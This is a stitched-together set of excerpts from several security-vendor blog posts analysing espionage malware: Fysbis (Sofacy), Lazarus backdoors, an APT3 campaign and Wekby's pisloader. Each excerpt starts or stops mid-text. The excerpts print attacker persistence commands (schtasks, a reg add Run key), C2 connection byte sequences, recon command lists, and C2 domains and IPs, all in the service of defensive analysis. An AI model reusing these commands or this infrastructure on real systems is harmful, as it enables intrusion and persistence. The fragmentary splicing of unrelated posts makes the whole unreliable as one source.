with references to mask, path, name, and info byte arrays.\\nFigure 6: Assembly view of Sample 3 root installation related byte arrays\\nAs it turns out, the referenced byte mask is applied to the other byte arrays using a rolling double-XOR algorithm to construct malware installation paths, filenames, and descriptions for a Linux root account. Corresponding INSTALLUSER byte arrays exist, which facilitate the non-root installation for the trojan. The same masking method is also used by the binary to decode malware configuration C2 information, further showcasing how a little symbolic information can go a long way towards completeness and higher confidence in assessment of a malware sample.\\nIf you would like to learn more about how Fysbis works, the samples analyzed remain fairly consistent with the sample analysis found here.\\nInfrastructure Analysis\\nAs Unit 42 has discussed in depth in other blog articles, we have observed that adversaries in general are seemingly hesitant in changing their infrastructure. This may be due to not wanting to commit additional resources, or simply a matter of retaining familiarity for the sake of timeliness. In either case, we see the same type of behavior here with the Fysbis samples in use by Sofacy.\\nThe oldest sample (Table 1), was found to beacon to the domain azureon-line[.]com, which had already been widely publicized as a known command and control domain for the Sofacy group. Using passive DNS, we can see that two of the original IPs this domain resolved to, 193.169.244[.]190 and 111.90.148[.]148 also mapped to a number of other domains that had been in use by the Sofacy group during that time period.\\nFigure 7: Sample 1 C2 resolutions\\nThe first of the newer samples (Table 2), continues the trend and beacons to an IP also widely associated with the Sofacy group, 198.105.125[.]74. This IP has been mostly associated with the tool specifically known as CHOPSTICK, which can be read about here.\\nFigure 8: Sample 2 C2 resolutions\\nThe newest sample (Table 3), introduces a previously unknown command and control beacon to mozilla-plugins[.]com. This activity aligns with the previously observed Sofacy group tactic of integrating legitimate company references into their infrastructure naming convention. Neither this new domain nor the IP it resolves to have been observed in the past, indicating that the sample in Table 3 may be associated with a newer campaign. Comparing this sample’s binary with the other two however, shows there are significant similarities on the code level as well as in terms of shared behavior.\\nFigure 9: Sample 3 C2 resolutions\\nConclusion\\nLinux is used across business and home environments and appears in a variety of form factors. It is a preferred platform within data centers and the cloud for businesses, as well as an ongoing favorite when it comes to a majority of Internet-facing web and application servers. Linux is also at the foundation of Android devices and a number of other embedded systems. The value proposition of Linux – especially when it comes to its use in the enterprise – can be broken out into three perceived benefits: lower total cost of ownership (TCO), security, and feature set. While numbers and comparison alone can contribute to measurement of TCO and feature set, security requires further qualification. Expertise in the Linux platform is highly sought after across all industries for multiple disciplines, from system administration to big data analytics to incident response.\\nThe majority of businesses still maintain Windows-heavy user environments where certain core infrastructure components also operate under Windows servers (e.g., Active Directory, SharePoint, etc.). This means, from a practical perspective, most of a business’s focus remains on supporting and protecting Windows assets. Linux remains a mystery to a number of enterprise IT specialists –most critically for network defenders. Identifying and qualifying potential incidents requires a familiarity with what constitutes normal operation in order to isolate anomalies. The same is true for any other asset in an environment, normal operation is entirely dependent on a given asset’s role / function in the enterprise.\\nLack of expertise and visibility into non-Windows platforms combine in some environments to present significant risks against an organization’s security posture. As a recent caution, the Linux vulnerability described under CVE-2016-0728 further demonstrates the potential breadth of real-world risks to associated platforms. A natural extension of this exposure is increased targeting by both dedicated and opportunistic attackers across various malicious actor motivations. Despite the lingering belief (and false sense of security) that Linux inherently yields higher degrees of protection from malicious actors, Linux malware and vulnerabilities do exist and are in use by advanced adversaries. To mitigate associated risks requires tailored integration of the people, processes, and technology in support of prevention, monitoring, and detection within an environment.\\nLinux malware detection and prevention is not prevalent at this time, but Palo Alto Networks customers are protected through our next-generation security platform:\\nIPS signature 14917 deployed to identify and prevent command and control activity\\nThe C2 domains and files mentioned in this report are blocked in our Threat Prevention product.\\nIndicators\\nType\\nValue\\nMD5\\n364ff454dcf00420cff13a57bcb78467\\nSHA256\\n8bca0031f3b691421cb15f9c6e71ce193\\n355d2d8cf2b190438b6962761d0c6bb\\nssdeep\\n3072:n+1R4tREtGN4qyGCXdHPYK9l\\n0H786O26BmMAwyWMn/qwwiHNl:n\\n+1R43QcILXdF0w6IBmMAwwCwwi\\nMD5\\n075b6695ab63f36af65f7ffd45cccd39\\nSHA-256\\n02c7cf55fd5c5809ce2dce56085ba437\\n95f2480423a4256537bfdfda0df85592\\nssdeep\\n3072:9ZAxHANuat3WWFY9nqjwbuZf\\n454UNqRpROIDLHaSeWb3LGmPTrI\\nW33HxIajF:9ZAxHANJAvbuZf454UN\\n+rv eQLZPTrV3Z\\nMD5\\ne107c5c84ded6cd9391aede7f04d64c8\\nSHA-256\\nfd8b2ea9a2e8a67e4cb3904b49c789d\\n57ed9b1ce5bebfe54fe3d98214d6a0f61\\nssdeep\\n6144:W/D5tpLWtr91gmaVy+mdckn6\\nBCUdc4mLc2B9:4D5Lqgkcj+\\nPath\\n/bin/rsyncd\\nPath Desc\\nsynchronize and backup service\\nPath\\n~/.config/dbus-notifier/dbus-inotifier\\nPath Desc\\nsystem service d-bus notifier\\nPath\\n/bin/ksysdefd\\nPath\\n~/.config/ksysdef/ksysdefd\\nPath Desc\\nsystem kernel service defender\\nC2\\nazureon-line[.]com\\nC2\\n198.105.125[.]74\\nC2\\nmozilla-plugins[.]com\\nC2\\nMozillaplagins[.]com\\nGet updates from\\nPalo Alto Networks!\\nSign up to receive the latest news, cyber threat intelligence and research from us\\nPlease enter your email address!\\nPlease mark, I'm not a robot!\\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\\nPopular ResourcesResource Center\\nBlog\\nCommunities\\nTech Docs\\nUnit 42\\nSitemap\\nLegal NoticesPrivacy\\nTerms of Use\\nDocuments\\nAccountManage Subscriptions\\nReport a Vulnerability\\n© 2020 Palo Alto Networks, Inc.

There seems to be a resurgence of activity from the group, and recent events show how their tools and techniques have evolved. Just last week they were found stealing millions from ATMs across Asia and Africa. We also recently discovered that they successfully planted their backdoor (detected by Trend Micro as BKDR_BINLODR.ZNFJ-A) into several machines of financial institutions across Latin America.\\nWe determined that these backdoors were installed on the targets’ machines on September 19 2018, based mainly on the service creation time of the loader component. We also saw that the attack technique bears some resemblance to a previous 2017 Lazarus attack, analyzed by BAE Systems, against targets in Asia. The use of FileTokenBroker.dll was a key part of the group’s attack in 2017, and they seem to have used the same modularized backdoor in the recent incident as well.\\nOur analysis of the backdoors used in the September 2018 attacks show that AuditCred.dll/ROptimizer.dll was similarly used:\\nFileTokenBroker.dll\\xa0 (2017 attack)\\nAuditCred.dll/Roptimizer.dll\\xa0 (2018 attack)\\nLaunch Method\\nService\\nService\\nFunction\\nLoader Component\\nLoader Component\\nWorking directory\\n%Windows%\\\\System32\\n%Windows%\\\\System32\\nLoaded Component Path\\n%Windows%\\\\System32\\\\en-US\\n%Program Files%\\\\Common Files\\\\System\\\\ado\\nLoaded Component Blending\\nBlends with .mui files\\nBlend with ActiveX data Object dll files\\nTable1: Similarities of the Loader components in both incidents\\nAnalysis of backdoors used in 2018\\nThe Lazarus group used a series of backdoors in their 2018 attacks, employing a complicated technique that involves three major components:\\nAuditCred.dll/ROptimizer.dll (detected by Trend Micro as BKDR_BINLODR.ZNFJ-A) – loader DLL that is launched as a service\\nMsadoz<n>.dll (detected by Trend Micro as BKDR64_BINLODR.ZNFJ-A) – encrypted backdoor\\nn = number of characters in the loader dll’s filename\\nAuditcred.dll.mui/rOptimizer.dll.mui (detected by Trend Micro as TROJ_BINLODRCONF.ZNFJ-A) – encrypted configuration file\\nFigure 1: Loading sequence of the modularized backdoor\\nThe loader DLL is installed as a service and uses different names (AuditCred and ROptimizer) on different machines. However, they still have the same capabilities and are essentially the same file. Its purpose is to load Msadoz<n>.dll in order to decrypt and execute it in memory.\\nFigure 2: AuditCred/ROptimizer Service\\nIf successfully installed, this particular backdoor poses quite a threat to its target. It is capable of the following functions:\\nCollect file/folder/drive information\\nDownload files and additional malware\\nLaunch/terminate/enumerate process\\nUpdate configuration data\\nDelete files\\nInject code from files to other running process\\nUtilize proxy\\nOpen reverse shell\\nRun in passive mode — instead of actively connecting to the command and control (C&C) server, the backdoor will open and listen to a port then receive commands through it\\nOnce the backdoor is loaded, it will then load the encrypted configuration file Auditcred.dll.mui/rOptimizer.dll.mui to extract the C&C information and connect to it. The connection is necessary for conducting activities; and based on the backdoor’s functions, these actions could be quite damaging to targets.\\nFigure 3: The first step of decryption will perform XOR on one byte using the previous adjacent byte, starting from the last byte and excluding the first byte\\nFigure 4: The second step uses RC4, using the first 0x20 bytes from the result of the first step as the RC4 key\\nFigure 5: Encrypted (Top) and decrypted (bottom) configuration file\\nIt is also important to note that while the loader component and the configuration file are located in the same directory (%windows%\\\\system32), the encrypted backdoor is located in a different directory (%Program Files%\\\\Common Files\\\\System\\\\ado). This complex setup makes it harder to detect and remove all the backdoors, and is more effective at hiding any activities.\\nThe complexity and the capabilities of these backdoors present a tough problem for the targeted organizations. It is a sophisticated attack that needs equally sophisticated security solutions.\\nTrend Micro Solutions\\nThe Lazarus group is an experienced organization, methodically evolving their tools and experimenting with strategies to get past an organization’s defenses. The backdoors they are deploying are difficult to detect and a significant threat to the privacy and security of enterprises, allowing attackers to steal information, delete files, install malware, and more.\\nThese and other tools used by the Lazarus group can be mitigated by routinely scanning the network for any malicious activity to help prevent the malware from entering and spreading through an organization. In addition, educating employees and other key people in an organization on social engineering techniques can allow them to identify what to look out for when it comes to malicious attacks.\\nOther mitigation strategies include a multilayered approach to securing the organization’s perimeter, which includes hardening the endpoints and employing application control to help prevent malicious applications and processes from being executed.\\nTrend Micro endpoint solutions such as Trend Micro™ Smart Protection Suites and Worry-Free™ Business Security can protect users and businesses from these threats by detecting malicious files and spammed messages as well as blocking all related malicious URLs. Trend Micro Deep Discovery™ has an email inspection layer that can protect enterprises by detecting malicious attachments and URLs that could lead to malicious downloads.\\nTrend Micro XGen™ security provides a cross-generational blend of threat defense techniques to protect systems from all types of threats.

This actor initiated their most recent campaign on November 19, 2014 targeting multiple organizations. The attacker leveraged multiple exploits, targeting both\\xa0CVE-2014-6332\\xa0and\\xa0CVE-2014-4113. CVE-2014-6332 was disclosed publicly on 2014-11-11 and is a Windows OLE Automation Array Remote Code Execution vulnerability. CVE-2014-4113 is a privilege escalation vulnerability that was\\xa0disclosed publicly on 2014-10-14.\\nThe use of CVE-2014-6332 is notable, as it demonstrates that multiple classes of actors, both criminal and APT alike, have now incorporated this exploit into their toolkits. Further, the use of both of these two known vulnerabilities in tandem is notable for APT3. This actor is historically known for leveraging zero-day vulnerabilities in widespread but infrequent phishing campaigns. The use of known exploits and more frequent attacks may indicate both a shift in strategy and operational tempo for this group.\\nThe Spearphish\\nThe body of the message is below:\\nOne Month\\'s Free Membership for The PLAYBOY ClUB 1080P HD VIDEOS 100,000 PHOTOS 4,000\\xa0\\xa0MODELS Nude Celebrities,Playmates,Cybergirls & More!

This CVE is a local kernel vulnerability that, with successful exploitation, would give any user SYSTEM access on the machine.\\nThe malware component, test.exe, uses the Windows command \"cmd.exe\" /C whoami” to verify it is running with the elevated privileges of “System” and creates persistence by creating the following scheduled task:\\nschtasks /create /tn \"mysc\" /tr C:\\\\Users\\\\Public\\\\test.exe /sc ONLOGON \\xa0\\xa0\\xa0 /ru \"System\"\\nWhen executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913. The malware sends the SOCKS5 connection request \"05 01 00\" and verifies the server response starts with \"05 00\". The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command \"05 01 00 01 c0 b8 3c e5 00 51\" and verifies that the first two bytes from the server are \"05 00\" (c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order).\\nOnce the connection to the server is established, the malware expects a message containing at least three bytes from the server. These first three bytes are the command identifier. The following commands are supported by the malware:\\nCommand ID\\nDescription\\n00 00 00\\nContent after command ID is written to:\\nC:\\\\Users\\\\[Username]\\\\AppData\\\\Local\\\\Temp\\\\notepad1.exe\\n00 00 01\\nDeletes the files:\\nC:\\\\Users\\\\[Username]\\\\AppData\\\\Local\\\\Temp\\\\notepad.exe\\nC:\\\\Users\\\\[Username]\\\\AppData\\\\Local\\\\Temp\\\\newnotepad.exe\\n00 00 02\\nMalware exits\\n00 00 03\\nMalware downloads the URL that follows the command ID.

The deflated exe was a variant of the same downloader described above and connected to 198.55.115.71 over port 1913 via SOCKS5 proxy. The secondary payload in that case was detected as Backdoor.APT.CookieCutter (aka Pirpi) and also named newnotepad.exe (MD5 8849538ef1c3471640230605c2623c67) and connected to the known APT3 domains:\\ninform.bedircati[.]com\\npn.lamb-site[.]com\\n210.109.99.64\\nThe 192.184.60.229 IP address seen in this current campaign also hosts securitywap[.]com – another known domain referenced in our Operation Clandestine Fox blog.\\nDOMAIN\\nFIRST SEEN\\nLAST SEEN\\nIP ADDRESS\\nsecuritywap.com\\n2014-11-17\\n2014-11-20\\n192.184.60.229\\nwww.securitywap.com\\n2014-11-17\\n2014-11-20\\n192.184.60.229\\nIn addition, the join.playboysplus[.]com exploit and payload delivery site resolves to 104.151.248.173.\\nThis IP has hosted other domains used by APT3 in past campaigns:\\nDOMAIN\\nFIRST SEEN\\nLAST SEEN\\nIP ADDRESS\\njoin.playboysplus[.]com\\n2014-11-21\\n2014-11-21\\n104.151.248.173\\nwalterclean[.]com\\n2014-11-18\\n2014-11-20\\n104.151.248.173\\nwww.walterclean[.]com\\n2014-11-18\\n2014-11-20\\n104.151.248.173\\nAs we discussed in our previous blog detailing\\xa0previous APT3 activity, the walterclean[.]com served as a Plugx/Kaba command and control server.\\nConclusion\\nAlthough APT3 is well known for employing zero-day exploits in their attacks, recent activity has demonstrated that they will also attack targets with known exploits or social engineering.\\nSince Operation Clandestine Fox, we have observed this actor execute multiple attacks that did not rely on zero-day exploits.\\xa0The combination of this sustained operational tempo and lack of zero-day exploits may indicate that this group has changed strategy and has decided to attack more frequently and does not have steady access to zero-day exploit code.\\xa0No matter the strategy, this actor has shown an ability to operate successfully.\\nIOCs for this threat can be found here.\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today\\'s advanced threats from FireEye.\\nShare\\nRecent Posts\\n28 Apr 2020Excelerating Analysis, Part 2 — X[LOOKUP] Gon’ Pivot To Ya\\n27 Apr 2020Putting the Model to Work: Enabling Defenders With Vulnerability\\nIntelligence — Intelligence for Vulnerability Management, Part Four\\n22 Apr 2020Vietnamese Threat Actors APT32 Targeting Wuhan Government and Chinese\\nMinistry of Emergency Management in Latest Example of COVID-19 Related Espionage\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages',\n",

Wekby is a group that has been active for a number of years, targeting various industries such as healthcare, telecommunications, aerospace, defense, and high tech. The group is known to leverage recently released exploits very shortly after those exploits are available, such as in the case of HackingTeam’s Flash zero-day exploit.\\nThe malware used by the Wekby group has ties to the HTTPBrowser malware family, and uses DNS requests as a command and control mechanism. Additionally, it uses various obfuscation techniques to thwart researchers during analysis. Based on metadata seen in the discussed samples, Palo Alto Networks has named this malware family ‘pisloader’.\\nInfrastructure\\nThe pisloader malware family was delivered via HTTP from the following URL. At the time of writing, this URL was still active.\\nhttp://globalprint-us[.]com/proxy_plugin.exe\\nOther samples hosted on this domain include the following:\\nhttp://globalprint-us[.]com/proxy_web_plugin.exe\\nMD5: E4968C8060EA017B5E5756C16B80B012\\nSHA256: 8FFBB7A80EFA9EE79E996ABDE7A95CF8DC6F9A41F9026672A8DBD95539FEA82A\\nSize: 126976 Bytes\\nCompile Time: 2016-04-28 00:38:46 UTC\\nThis discovered file was found to be an instance of the common Poison Ivy malware family with the following configuration data:\\nCommand and Control Address: intranetwabcam[.]com\\nCommand and Control Port: 80\\nPassword: admin\\nMutex: )!VoqA.I5\\nThe domains witnessed in this attack were all registered very shortly prior to being used. The following domains have been witnessed in this attack:\\nAdditionally, the following IP resolutions have been observed.\\nInitial Dropper\\nThe following sample was discovered initially and is referenced in the subsequent analysis:\\nMD5: E8D58AA76DD97536AC225949A2767E05\\nSHA256: DA3261C332E72E4C1641CA0DE439AF280E064B224D950817A11922A8078B11F1\\nSize: 126976 Bytes\\nCompile Time: 2016-04-27 14:37:34 UTC\\nThis particular file has the following metadata properties. The references to ‘pisload2’ led to the naming of this malware family.\\nFigure 1 pisloader dropper metadata\\nThe initial dropper contains very simple code that is responsible for setting persistence via the Run registry key, and dropping and executing an embedded Windows executable. Limited obfuscation was encountered, where the authors split up strings into smaller sub-strings and used ‘strcpy’ and ‘strcat’ calls to re-build them prior to use. They also used this same technique to generate garbage strings that are never used. This is likely to deter detection and analysis of the sample. The following decompiled code demonstrates this. Comments have been added to show the fully-generated strings.\\nFigure 2 pisloader dropper building strings and setting persistence\\nIn the above decompiled code, we see that the pisloader is generating the following string, which eventually is called to set the Run registry key.\\ncmd.exe /c reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v lsm /t reg_sz /d “%appdata%\\\\lsm.exe” /f\\nThis particular command will set the HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\lsm registry key with a value of “%appdata%\\\\lsm.exe”. After this key is set, the malware proceeds to decrypt a two blobs of data with a single-byte XOR key of 0x54. The resulting data is written to the %appdata%\\\\lsm.exe file path.\\nAfter this file is written, the malware executes the newly written lsm.exe file, which contains the pisloader payload.\\nPayload\\nThe following sample was discovered and is referenced in the subsequent analysis:\\nMD5: 07B9B62FB3B1C068837C188FEFBD5DE9\\nSHA256: 456FFFC256422AD667CA023D694494881BAED1496A3067485D56ECC8FEFBFAEB\\nSize: 102400 Bytes\\nCompile Timestamp: 2016-04-27 13:39:02 UTC\\nThe payload is heavily obfuscated using a return-oriented programming (ROP) technique, as well as a number of garbage assembly instructions. In the example below, code highlighted in red essentially serves no purpose other than to deter reverse-engineering of the sample. This code can be treated as garbage and ignored. The entirety of the function is highlighted in green, where two function offsets are pushed to the stack, followed by a return instruction. This return instruction will point code execution first at the null function, which in turn will point code execution to the ‘next_function’. This technique is used throughout the runtime of the payload, making static analysis difficult.\\nFigure 3 Obfuscated code witnessed in pisloader\\nThe malware is actually quite simplistic once the obfuscation and garbage code is ignored. It will begin by generating a random 10-byte alpha-numeric header. The remaining data is base32-encoded, with padding removed. This data will be used to populate a subdomain that will be used in a subsequent DNS request for a TXT record.\\nThe use of DNS as a C2 protocol has historically not been widely adopted by malware authors. Notable exceptions include the following:\\nFrameworkPOS\\nC3PRO-RACCOON\\nFeederBot\\nMorto\\nPlugX Variants\\nThe use of DNS as a C2 allows pisloader to bypass certain security products that may not be inspecting this traffic correctly.\\nFigure 4 DNS query for TXT record by malware\\nThe pisloader sample will send a beacon periodically that is composed of a random 4-byte uppercase string that is used as the payload. An example of this can be found below:\\nFigure 5 pisloader DNS beacon request\\nThe malware expects various aspects of the DNS responses to be set in a specific way, or else pisloader will ignore the DNS reply. The following DNS flags must be set. Should any additional flags be set, the response will be ignored.\\nResponse\\nRecursion Desired\\nRecursion Available\\nThe ‘Questions’ field must be set to a value of 0x1. The ‘Answer Resource Records’ field must be set to a value of 0x1. Additionally, the response query subdomain must match the original DNS request.\\nThe remote command and control (C2) server is statically embedded within the malware. A single host of ‘ns1.logitech-usa[.]com’ is found in this specific sample.\\nThe C2 server will respond with a TXT record that is encoded similar to the initial request. In the response, the first byte is ignored, and the remaining data is base32-encoded. An example of this can be found below.\\nFigure 6 Example TXT response by C2 server\\nThe following commands, and their descriptions are supported by the malware:\\nsifo – Collect victim system information\\ndrive – List drives on victim machine\\nlist – List file information for provided directory\\nupload – Upload a file to the victim machine\\nopen – Spawn a command shell\\nSome examples of these commands being used can be seen below.

This is consistent with previous versions of HTTPBrowser, which is another malware family frequently used by the Wekby group.\\nAdditionally, a number of commands themselves, such as the ‘list’, ‘drive’, and ‘upload’ commands are consistent with HTTPBrowser. The formatted responses from these commands are also identical. A known HTTPBrowser sample was spotted with similar metadata as the discussed pisloader sample, which adds further credibility that pisloader is likely a variant of this malware family.\\nAdditionally, the code used to generate these commands is available via GitHub.\\nConclusion\\nThe Wekby group continues to target various high profile organizations using sophisticated malware. The pisloader malware family uses various novel techniques, such as using DNS as a C2 protocol, as well as making use of return-oriented programming and other anti-analysis tactics.\\nPalo Alto Networks customers are protected against this threat in the following ways:\\nWildFire correctly identifies all pisloader samples as malicious\\nA pisloader AutoFocus tag has been created in order to track this malware family\\nAll domains/IPs used in this attack have been flagged as malicious.\\nAn IPS rule has been created to detect pisloader DNS traffic\\nAppendix\\nExternal Resources\\nhttps://blog.anomali.com/evasive-maneuvers-the-wekby-group-attempts-to-evade-analysis-via-custom-rop\\nhttp://www.volexity.com/blog/?p=158\\nhttps://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage\\nhttps://www.zscaler.com/blogs/research/chinese-cyber-espionage-apt-group-leveraging-recently-leaked-hacking-team-exploits-target-financial-services-firm\\nhttps://www.fireeye.com/blog/threat-research/2015/07/demonstrating_hustle.html\\nSHA256 Hashes\\nda3261c332e72e4c1641ca0de439af280e064b224d950817a11922a8078b11f1\\n930772d6af8f43f62ea78092914fa8d6b03e8e3360dd4678eec1a3dda17206ed\\n6852ba95720af64809995e04f4818517ca1bd650bc42ea86d9adfdb018d6b274\\n9200f80c08b21ebae065141f0367f9c88f8fed896b0b4af9ec30fc98c606129b\\n4d62caef1ca8f4f9aead7823c95228a52852a1145ca6aaa58ad8493e042aed16\\n1b341dab023de64598d80456349db146aafe9b9e2ec24490c7d0ac881cecc094\\n456fffc256422ad667ca023d694494881baed1496a3067485d56ecc8fefbfaeb\\nDomains\\nns1.logitech-usa[.]com\\nglobalprint-us[.]com\\nintranetwabcam[.]com\\nlogin.access-mail[.]com\\nglb.it-desktop[.]com\\nlocal.it-desktop[.]com\\nhi.getgo2[.]com\\nGet updates from\\nPalo Alto Networks!\\nSign up to receive the latest news, cyber threat intelligence and research from us\\nPlease enter your email address!\\nPlease mark, I'm not a robot!\\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\\nPopular ResourcesResource Center\\nBlog\\nCommunities\\nTech Docs\\nUnit 42\\nSitemap\\nLegal NoticesPrivacy\\nTerms of Use\\nDocuments\\nAccountManage Subscriptions\\nReport a Vulnerability\\n© 2020 Palo Alto Networks, Inc.

Emissary is related to the Elise Trojan and the Operation Lotus Blossom attack campaign, which prompted us to start collecting additional samples of Emissary.\\nThe oldest sample we found was created in 2009, indicating this tool has been in use for almost seven years. Of note, this is three years earlier than the oldest Elise sample we have found, suggesting this group has been active longer than previously documented. In addition, Emissary appears to only be used against Taiwanese or Hong Kong based targets, all of the decoys are written in Traditional Chinese, and they use themes related to the government or military.\\nWe also found several different versions of Emissary that had several iterative changes that show how the Trojan evolved over the years. One of the most interesting observations made during this analysis is that the amount of development effort devoted to Emissary significantly increased after we published our Operation Lotus Blossom report in June 2015, resulting in many new versions of the Emissary Trojan. In addition, we observed a TTP shift post publication with regards to their malware delivery; they started using compromised but legitimate domains to serve their malware. Interestingly, the C2 infrastructure is also somewhat different than that used by Elise.\\nTargeting\\nIn contrast to Elise, which was used in attacks against multiple Southeast Asian countries in region appropriate languages, all of the Emissary decoys we’ve collected are written in Traditional Chinese, which is used primarily in Taiwan and Hong Kong. The targets we have identified are also limited to those two regions. Despite appearing to target a more limited geographical range, Emissary targeted the government, higher education, and high tech companies with a mix of copy and pasted news articles and documents that do not appear to be available online. Decoys include:\\nAn Excel spreadsheet containing legitimate contact information for much of the Taiwanese government that does not appear to be available online.\\nCopy and paste of a news article where the Deputy Commander of the Nanjing Military region, Wang Huanguang, responds negatively to a 2014 magazine article from a respected US Taiwan scholar saying the odds of China and Taiwan reuniting is low and discussing the issues with an attempted military takeover.\\nCopy of a news article from 2010 about the Chinese League of Victims protesting the involuntary removal of Shanghai residents in the lead up to the Shanghai Expo.\\nCopy of the official Taiwan holiday schedule for 2016, which is the 105th anniversary of the current Taiwanese government.\\nFigure 1: Partial screenshot of the response from Deputy Commander of the Nanjing Military Region Wang Huangguang.\\nEvolve to Survive: TTP Shifts and Infrastructure\\nWe’ve expanded our knowledge of Emissary infrastructure significantly since our first Emissary blog and we’ve found almost exclusive use of Dynamic DNS (DDNS) domains with only one purchased from a Chinese reseller. In contrast, the Elise samples used a mix of actor-registered and DDNS, with the actor-registered serving as one of the data points we used to tie all of the activity together. While the use of DDNS can make tying activity together more difficult, and despite the new Emissary variants since our publication, two of the most recent C2s resolved to IPs used by Elise C2s detailed in Operation Lotus Blossom. The Emissary samples typically have three hardcoded C2s that are a mix of IPs and domain names, with one of the domains or IPs not being used by the other three C2s in a likely effort to avoid loss of control. A full IOC list is included at the end of this report.\\nAlso new is the actors’ use of compromised legitimate Taiwanese websites to serve their malware, including the official website of the Democratic Progressive Party. This is particularly interesting as Taiwan just held a closely watched Presidential election on 16 January where DPP candidate Tsai Ing-wen won. This marked the first time a woman was elected President of Taiwan and only the second time a member of the Kuomintang did not hold the office since being ousted from China in 1949 when the Communist Party of China took power. In line with her party’s stance, she is widely seen as a proponent of an independent Taiwan and not in favor of reunification with the People’s Republic of China.\\nMalware Updates\\nOur evidence suggests that malware authors created Emissary as early as 2009, which suggests that threat actors have relied on this tool as a payload in cyber-espionage attacks for many years. The Emissary Trojan is a capable tool to gain a foothold on a targeted system. While it lacks more advanced functionality like screen capturing, it is still able to carry out most tasks desired by threat actors: exfiltration of files, ability to download and execute additional payloads, and gain remote shell access. It appears that threat actors have continually used this Trojan, and developed several updated versions of Emissary to remain undetected and fresh over time.\\nWe analyzed all of the known Emissary samples to determine what changes the malware author made between the different versions of the Trojan. During our analysis, we examined when each sample was created based on its compile time and produced a simple timeline, seen in Figure 2, to display the development efforts expended on the Emissary Trojan. It should be noted that we know some Emissary samples have been used multiple times with different configurations, so the timeline only shows when development activity took place on Emissary and should not be misconstrued to when Emissary was used in attacks.\\nThe timeline in Figure 2 shows that the Emissary Trojan was first created (version 1.0) in May 2009 and quickly received an update that resulted in version 1.1 in June 2009. The Trojan did not receive much in the form of updates until September 2011 when the author released version 2.0. Version 2.0 received one update in October 2013 before the malware author released version 3.0 in December 2014. The malware author released version 4.0 in March 2015, but curiously created a version 3.0 sample afterwards on June 26, 2015, which was out-of-sequence from the incrementing versioning. Between August and November 2015 the malware author creates several new versions of Emissary, specifically 5.0, 5.1, 5.3 and 5.4 in a much more rapid succession compared to development process in earlier versions.\\nFigure 2: Timeline of development efforts spent on Emissary\\nThe out-of-sequence version 3.0 appears to be an early variant of version 5.0 based on significant similarities (discussed in the changelog section) that are not seen in the original version 3.0 and other earlier versions of Emissary. One campaign code associated with of the out-of-sequence version 3.0 sample was “3test”, suggesting the malware author created it for testing purposes. The other campaign code associated with the out-of-sequence sample was “IC00001”, which could denote an attack payload as it appears to be a plausible code to describe a campaign.\\nWhile this may be coincidental, the out-of-sequence version 3.0 sample was created ten days after we published the Operation Lotus Blossom paper that exposed the Elise Trojan that is closely related to Emissary. It is possible that the threat actors were prompted to make malware changes in response to our research. Regardless of causation, the rapid development of new versions of Emissary suggests that the malware authors are making frequent modifications to evade detection, which as a corollary suggests the threat actors are actively using the Emissary Trojan as a payload in attacks.\\nEmissary Changelog\\nIn this section, we discuss the changes observed between each version of Emissary. As this section is focused on changes, the features and functionality are the same between Emissary versions unless otherwise mentioned.\\nVersion 1.0\\nDate: 5/12/2009\\nSHA256: a7d07b92e48876e2195e5d8769a47cf0a237e11ac304e41b14fc36042b0d9484 Original Name: WUMsvc.dll\\nInitial Release\\nThe initial loader Trojan writes Emissary to %SYSTEM%\\\\WSPsvc.dll and installs it as a service, which will run the exported function “ServiceMain” within the Emissary Trojan to carry out its functionality.\\nConfiguration data is stored in the last 1024 bytes of the payload, from which the Trojan will extract an 896 byte structure. The configuration is decrypted with an algorithm that uses the XOR operation on each byte using the value at a different offset within the ciphertext.\\nThe code will create the following registry keys:\\nHKEY_CLASSES_ROOT\\\\Shell.LocalServer\\\\CheckCode\\nHKEY_CLASSES_ROOT\\\\Shell.LocalServer\\\\CheckID\\n12\\nHKEY_CLASSES_ROOT\\\\Shell.LocalServer\\\\CheckCodeHKEY_CLASSES_ROOT\\\\Shell.LocalServer\\\\CheckID\\nEmissary uses the “CheckCode” registry key to store the encrypted configuration for the Trojan, while it stores a GUID that Emissary uses to uniquely identify the compromised host in the “CheckID” key.\\nThe malware performs initial system information gathering and saves data to a file named TMP2548. The initial gathering relies on a combination of the following commands executed by the command prompt:\\ncommands executed by the command prompt:\\nECHO VER\\nVER\\nECHO IPCONFIG /ALL\\nIPCONFIG /ALL\\nECHO NET LOCALGROUP ADMINISTRATORS\\nNET LOCALGROUP ADMINISTRATORS\\nECHO NET START\\nNET START\\nECHO GPRESULT /Z\\nGPRESULT /Z\\nECHO GPRESULT\\n/SCOPE COMPUTER /Z\\nGPRESULT\\n/SCOPE COMPUTER /Z\\nECHO SYSTEMINFO\\nSYSTEMINFO\\n12345678910111213141516\\ncommands executed by the command 